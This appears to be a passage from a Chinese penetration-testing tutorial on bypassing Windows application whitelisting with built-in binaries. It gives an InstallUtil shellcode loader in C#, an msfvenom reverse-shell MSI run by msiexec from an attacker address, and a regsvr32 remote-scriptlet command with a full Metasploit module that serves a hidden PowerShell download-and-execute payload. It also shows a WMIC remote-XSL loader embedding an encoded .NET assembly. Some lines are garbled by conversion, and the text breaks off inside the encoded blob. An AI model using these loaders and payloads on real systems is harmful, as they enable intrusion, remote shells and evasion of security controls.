<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe &#x2F;r:System.Ente rpriseServices.dll &#x2F;r:System.IO.Compression.dll &#x2F;target:library &#x2F;out:Mic opoor.exe &#x2F;platform:x64 &#x2F;unsafe C:\Users\John\Desktop\Micropoor_Csc.cs</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;U C:\Users\John\Desktop\Micropoor.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>附录：Micropoor_Csc.cs</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Configuration.Install;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">public class Program </span><br><span class="line">&#123;</span><br><span class="line">	public static void Main() </span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">[System.ComponentModel.RunInstaller(true)]  </span><br><span class="line">public class Sample : System.Configuration.Install.Installer </span><br><span class="line">&#123;</span><br><span class="line">	public override void Uninstall(System.Collections.IDictionary savedState) </span><br><span class="line">	&#123;</span><br><span class="line">		Shellcode.Exec();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Shellcode </span><br><span class="line">&#123;</span><br><span class="line">	public static void Exec() </span><br><span class="line">	&#123;</span><br><span class="line">		byte[] shellcode &#x3D; new byte[510] &#123;&#125;;</span><br><span class="line">		UInt32 funcAddr &#x3D; VirtualAlloc(0, (UInt32)shellcode .Length,  </span><br><span class="line">		MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">		Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);</span><br><span class="line">		IntPtr hThread &#x3D; IntPtr.Zero;</span><br><span class="line">		UInt32 threadId &#x3D; 0;</span><br><span class="line">		IntPtr pinfo &#x3D; IntPtr.Zero;</span><br><span class="line">		hThread &#x3D; CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">		WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">	&#125;</span><br><span class="line">	private static UInt32 MEM_COMMIT &#x3D; 0x1000;</span><br><span class="line">	private static UInt32 PAGE_EXECUTE_READWRITE &#x3D; 0x40;</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern bool VirtualFree(IntPtr lpAddress,  </span><br><span class="line">	UInt32 dwSize, UInt32 dwFreeType);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern IntPtr CreateThread(  </span><br><span class="line">	UInt32 lpThreadAttributes,  </span><br><span class="line">	UInt32 dwStackSize,  </span><br><span class="line">	UInt32 lpStartAddress,  </span><br><span class="line">	IntPtr param,  </span><br><span class="line">	UInt32 dwCreationFlags,  </span><br><span class="line">	ref UInt32 lpThreadId  </span><br><span class="line">	);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern bool CloseHandle(IntPtr handle);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern UInt32 WaitForSingleObject(  </span><br><span class="line">	IntPtr hHandle, </span><br><span class="line">	UInt32 dwMilliseconds  </span><br><span class="line">	);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern IntPtr GetModuleHandle(  </span><br><span class="line">	string moduleName  </span><br><span class="line">	);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern UInt32 GetProcAddress(  </span><br><span class="line">	IntPtr hModule,  </span><br><span class="line">	string procName  </span><br><span class="line">	);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern UInt32 LoadLibrary(  </span><br><span class="line">	string lpFileName  </span><br><span class="line">	);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]  </span><br><span class="line">	private static extern UInt32 GetLastError();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="78-基于白名单Msiexec执行payload第八季"><a href="#78-基于白名单Msiexec执行payload第八季" class="headerlink" title="78. 基于白名单Msiexec执行payload第八季"></a>78. 基于白名单Msiexec执行payload第八季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\msiexec.exe</span><br><span class="line">C:\WINDOWS\SysWOW64\msiexec.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>配置payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.1.4 LPORT&#x3D;53 ‐ f msi &gt; Micropoor_rev_x64_53.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\msiexec.exe &#x2F;q &#x2F;i http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor_rev\_x64_53.txt</span><br></pre></td></tr></table></figure>
<h2 id="79-基于白名单Regsvr32执行payload第九季"><a href="#79-基于白名单Regsvr32执行payload第九季" class="headerlink" title="79. 基于白名单Regsvr32执行payload第九季"></a>79. 基于白名单Regsvr32执行payload第九季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\SysWOW64\regsvr32.exe</span><br><span class="line">C:\WINDOWS\system32\regsvr32.exe</span><br></pre></td></tr></table></figure>
<p>msf 已内置auxiliary版本的regsvr32_command_delivery_server，但是最新版已经无 exploit版本regsvr32</p>
<ul>
<li>配置攻击机msf</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;regsvr32_command_delivery_server</span><br><span class="line">set CMD net user Micropoor Micropoor &#x2F;add</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.1.4:8080&#x2F;ybn7xESQYCGv scrobj.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>powershell 版 Regsvr32</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">class MetasploitModule &lt; Msf::Exploit::Remote  </span><br><span class="line">Rank &#x3D; ManualRanking  </span><br><span class="line">include Msf::Exploit::Powershell  </span><br><span class="line">include Msf::Exploit::Remote::HttpServer  </span><br><span class="line">def initialize(info &#x3D; &#123;&#125;)  </span><br><span class="line">super(update_info(info,  </span><br><span class="line">&#39;Name&#39; &#x3D;&gt; &#39;Regsvrexe (.sct) Application Whitelisting Bypass Serve r&#39;,&#39;Description&#39; &#x3D;&gt; %q(</span><br><span class="line">This module simplifies the Regsvrexe Application Whitelisting Bypass technique. </span><br><span class="line">The module creates a web server that hosts an .sct file. </span><br><span class="line">When the user types the provided regsvr32 command on a system, regsvr32 will request the .sct file and then execute the included PowerShell command. </span><br><span class="line">This command then downloads and executes the specified payload (similar to the web_delivery module with PSH). </span><br><span class="line">Both web requests (i.e., the .sct file and PowerShell download and execute) can occur on the same port. </span><br><span class="line">),  </span><br><span class="line">&#39;License&#39; &#x3D;&gt; MSF_LICENSE,  </span><br><span class="line">&#39;Author&#39; &#x3D;&gt;  </span><br><span class="line">[  </span><br><span class="line">&#39;Casey Smith&#39;, # AppLocker bypass research and vulnerability discover y(@subTee)  </span><br><span class="line">&#39;Trenton Ivey&#39;, # MSF Module (kn0)  </span><br><span class="line">],  </span><br><span class="line">&#39;DefaultOptions&#39; &#x3D;&gt;  </span><br><span class="line">&#123;  </span><br><span class="line">&#39;Payload&#39; &#x3D;&gt; &#39;windows&#x2F;meterpreter&#x2F;reverse_tcp&#39;  </span><br><span class="line">&#125;,  </span><br><span class="line">&#39;Targets&#39; &#x3D;&gt; [[&#39;PSH&#39;, &#123;&#125;]],  </span><br><span class="line">&#39;Platform&#39; &#x3D;&gt; %w(win),  </span><br><span class="line">&#39;Arch&#39; &#x3D;&gt; [ARCH_X86, ARCH_X86_64],  </span><br><span class="line">&#39;DefaultTarget&#39; &#x3D;&gt; 0,  </span><br><span class="line">&#39;DisclosureDate&#39; &#x3D;&gt; &#39;Apr 19 2016&#39;,  </span><br><span class="line">&#39;References&#39; &#x3D;&gt;  </span><br><span class="line">[  </span><br><span class="line">[&#39;URL&#39;, &#39;http:&#x2F;&#x2F;subt0xblogspot.com&#x2F;2016&#x2F;04&#x2F;bypass‐application‐whitelisting‐ script.html&#39;]  </span><br><span class="line">]  </span><br><span class="line">))  </span><br><span class="line">end  </span><br><span class="line">def primer  </span><br><span class="line">print_status(&#39;Run the following command on the target machine:&#39;)  </span><br><span class="line">print_line(&quot;regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:#&#123;get_uri&#125;.sct scrobj.dll&quot;)  </span><br><span class="line">end  </span><br><span class="line">def on_request_uri(cli, _request)</span><br><span class="line"># If the resource request ends with &#39;.sct&#39;, serve the .sct file  </span><br><span class="line"># Otherwise, serve the PowerShell payload  </span><br><span class="line">if _request.raw_uri &#x3D;~ &#x2F;.sct$&#x2F;  </span><br><span class="line">serve_sct_file else  </span><br><span class="line">serve_psh_payload  </span><br><span class="line">end  </span><br><span class="line">end  </span><br><span class="line">def serve_sct_file  </span><br><span class="line">print_status(&quot;Handling request for the .sct file from #&#123;cli.peerhost&#125;&quot;)  </span><br><span class="line">ignore_cert &#x3D; Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl  </span><br><span class="line">download_string &#x3D; Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(get_uri)  </span><br><span class="line">download_and_run &#x3D; &quot;#&#123;ignore_cert&#125;#&#123;download_string&#125;&quot;  </span><br><span class="line">psh_command &#x3D; generate_psh_command_line(  </span><br><span class="line">noprofile: true,  </span><br><span class="line">windowstyle: &#39;hidden&#39;,  </span><br><span class="line">command: download_and_run  </span><br><span class="line">)  </span><br><span class="line">data &#x3D; gen_sct_file(psh_command)  </span><br><span class="line">send_response(cli, data, &#39;Content‐Type&#39; &#x3D;&gt; &#39;text&#x2F;plain&#39;)  </span><br><span class="line">end  </span><br><span class="line">def serve_psh_payload  </span><br><span class="line">print_status(&quot;Delivering payload to #&#123;cli.peerhost&#125;&quot;)  </span><br><span class="line">data &#x3D; cmd_psh_payload(payload.encoded,  </span><br><span class="line">payload_instance.arch.first,  </span><br><span class="line">remove_comspec: true,  </span><br><span class="line">use_single_quotes: true  </span><br><span class="line">)  </span><br><span class="line">send_response(cli,data,&#39;Content‐Type&#39; &#x3D;&gt; &#39;application&#x2F;octet‐stream&#39;)  </span><br><span class="line">end  </span><br><span class="line">def rand_class_id  </span><br><span class="line">&quot;#&#123;Rex::Text.rand_text_hex 8&#125;‐#&#123;Rex::Text.rand_text_hex 4&#125;‐# &#123;Rex::Text.rand_text_hex 4&#125;‐#&#123;Rex::Text.rand_text_hex 4&#125;‐# &#123;Rex::Text.rand_text_hex12&#125;&quot;  </span><br><span class="line">end  </span><br><span class="line">def gen_sct_file(command)  </span><br><span class="line">% </span><br><span class="line">&#123;</span><br><span class="line">	&lt;?XML version&#x3D;&quot;0&quot;?&gt;&lt;scriptlet&gt;&lt;registrationprogid&#x3D;&quot;#&#123;rand_text_alphanumeric 8&#125;&quot;</span><br><span class="line">	classid&#x3D;&quot;&#123;#&#123;rand_class_id&#125;&#125;&quot;&gt;&lt;script&gt;&lt;![CDATA[ var r &#x3D; ne wActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;#&#123;command&#125;&quot;,0);</span><br><span class="line">	]]&gt;&lt;script&gt;&lt;&#x2F;registration&gt; &lt;&#x2F;scriptlet&gt;</span><br><span class="line">&#125;</span><br><span class="line">end  </span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<ul>
<li><ul>
<li>使用方法</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy regsvr32_applocker_bypass_server.rb to &#x2F;usr&#x2F;share&#x2F;metasploit- framework&#x2F;modules&#x2F;exploits&#x2F;windows&#x2F;misc</span><br></pre></td></tr></table></figure>
<h2 id="80-基于白名单Wmic执行payload第十季"><a href="#80-基于白名单Wmic执行payload第十季" class="headerlink" title="80. 基于白名单Wmic执行payload第十季"></a>80. 基于白名单Wmic执行payload第十季</h2></li>
<li><p>Windows 2003 默认位置：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\wbem\wmic.exe</span><br><span class="line">C:\WINDOWS\SysWOW64\wbem\wmic.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\wbem\WMIC.exe</span><br><span class="line">C:\Windows\SysWOW64\wbem\WMIC.exe</span><br></pre></td></tr></table></figure>
<ul>
<li><p>靶机执行</p>
<ul>
<li>Win 7</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SysWOW64\wbem\WMIC.exe os get &#x2F;format:&quot;http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor.xsl&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>2003</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMIC.exe os get &#x2F;format:&quot;http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor_2003.xsl&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Micropoor_Win7.xsl</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">	xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.worg&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas‐microsoft‐ com:xslt&quot;</span><br><span class="line">	xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">	version&#x3D;&quot;0&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;ms:script implements‐prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		&lt;![CDATA[</span><br><span class="line"></span><br><span class="line">		function setversion() &#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function debug(s) &#123;&#125;</span><br><span class="line"></span><br><span class="line">		function base64ToStream(b) &#123;</span><br><span class="line"></span><br><span class="line">		var enc &#x3D; new ActiveXObject(&quot;System.Text.ASCIIEncoding&quot;);</span><br><span class="line"></span><br><span class="line">		var length &#x3D; enc.GetByteCount_2(b);</span><br><span class="line"></span><br><span class="line">		var ba &#x3D; enc.GetBytes_4(b);</span><br><span class="line"></span><br><span class="line">		var transform &#x3D; new ActiveXObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;);</span><br><span class="line"></span><br><span class="line">		ba &#x3D; transform.TransformFinalBlock(ba, 0, length);</span><br><span class="line"></span><br><span class="line">		var ms &#x3D; new ActiveXObject(&quot;System.IO.MemoryStream&quot;);</span><br><span class="line"></span><br><span class="line">		ms.Write(ba, 0, (length &#x2F; 4) * 3);</span><br><span class="line"></span><br><span class="line">		ms.Position &#x3D; 0;</span><br><span class="line"></span><br><span class="line">		return ms;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		var serialized_obj &#x3D; &quot;AAEAAAD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;+  </span><br><span class="line">&quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;+  </span><br><span class="line">&quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;+  </span><br><span class="line">&quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;+  </span><br><span class="line">&quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;+  </span><br><span class="line">&quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;+  </span><br><span class="line">&quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;+  </span><br><span class="line">&quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;+  </span><br><span class="line">&quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;+  </span><br><span class="line">&quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;+  </span><br><span class="line">&quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;+  </span><br><span class="line">&quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;+  </span><br><span class="line">&quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;+  </span><br><span class="line">&quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;+  </span><br><span class="line">&quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;+  </span><br><span class="line">&quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;+  </span><br><span class="line">&quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;+  </span><br><span class="line">&quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;+  </span><br><span class="line">&quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;+  </span><br><span class="line">&quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;+  </span><br><span class="line">&quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;+  </span><br><span class="line">&quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD&#x2F;&#x2F;wAAuAAAAAAAAABAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy&quot;+  </span><br><span class="line">&quot;YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAVC1CXAAAAAAA&quot;+</span><br><span class="line">&quot;AAAA4AACIQsBCwAADAAAAAYAAAAAAAAOKgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAwCkA&quot;+  </span><br><span class="line">&quot;AEsAAAAAQAAA0AIAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span 